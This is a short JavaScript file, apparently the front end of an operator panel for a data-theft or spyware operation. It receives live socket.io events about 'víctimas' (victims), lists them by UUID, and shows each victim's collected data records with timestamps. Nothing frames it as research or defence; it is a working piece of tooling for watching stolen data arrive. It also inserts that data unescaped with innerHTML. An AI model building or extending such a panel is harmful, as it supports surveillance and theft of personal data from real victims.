const socket = io();

socket.on('nuevo_dato', (data) => {
    console.log("Nuevo dato:", data);

    const victimasDiv = document.getElementById('victimas');
    let victimaDiv = document.getElementById(data.uuid);
    if (!victimaDiv) {
        victimaDiv = document.createElement('div');
        victimaDiv.className = "victima";
        victimaDiv.id = data.uuid;
        victimaDiv.innerText = `Víctima: ${data.uuid}`;
        victimaDiv.onclick = () => cargarDetalles(data.uuid);
        victimasDiv.appendChild(victimaDiv);
    }
});

async function cargarDetalles(uuid) {
    const res = await fetch(`/api/victima/${uuid}`);
    const datos = await res.json();
    const detallesDiv = document.getElementById('detalles');
    detallesDiv.innerHTML = `<h2>Datos de ${uuid}</h2>`;
    datos.forEach(d => {
        detallesDiv.innerHTML += `
            <div><strong>${d.tipo}</strong>: ${d.datos} <br><em>${d.timestamp}</em></div>
        `;
    });
}

